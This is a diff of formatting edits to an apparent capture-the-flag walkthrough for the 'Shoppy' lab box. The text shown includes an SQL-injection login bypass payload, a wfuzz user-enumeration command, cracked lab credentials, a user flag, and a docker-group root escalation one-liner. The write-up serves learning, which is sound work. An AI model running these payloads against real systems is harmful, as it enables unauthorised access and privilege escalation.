@@ -18,11 +18,12 @@ PORT   STATE SERVICE VERSION
 |_http-title: Did not follow redirect to http://shoppy.htb
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
-
+	
 Hostname: shoppy.htb
-## Webapp
+# Webapp
 ## Site 1
 Login page at shoppy.htb/login
+
 Bypass authentication with sqli
 ```sql
 '||'1==1
@@ -31,12 +32,12 @@ which can enumerate users.
 ```bash
 wfuzz -w /usr/share/seclists/Usernames/Names/names.txt -d "username=FUZZ'||'1==1&password=password" --hh 51 http://shoppy.htb/login
 ```
-Found 2 valid users.
-Josh and admin.
+Found 2 valid users, Josh and admin.
 
 You can get the user's hashes. from the search button on the website.
 josh:6ebcea65320589ca4f2f1ce039975995
-Looks like a md5sum which cracks to remembermethisway
+Looks like a md5sum which cracks to `remembermethisway`.
+
 Try to ssh onto the box, but it doesn't work.
 ## Site 2
 Check for subdomains.
@@ -51,11 +52,13 @@ jaeger:Sh0ppyBest@pp!
 ```
 # Foothold
 ssh onto the box: 
+
 User flag: 
 ```
 00205ca0b36ca0c118f497536ca0d354
 ```
 Check sudo -l 
+
 can run /home/deploy/password-manager as deploy
 
 ## Reversing the binary (very badly)
@@ -71,6 +74,7 @@ Please enter your master password: apples?
 Access denied! This incident will be reported !
 ```
 The 'Sample' string doesn't show.
+
 Trying that as the password works!
 ```txt
 Deploy Creds :
@@ -101,6 +105,7 @@ su deploy
 ```
 
 Running `id` shows that deploy is part of the docker group.
+
 GTFObins has a docker privesc
 ```bash
 docker run -v /:/mnt --rm -it alpine chroot /mnt bash
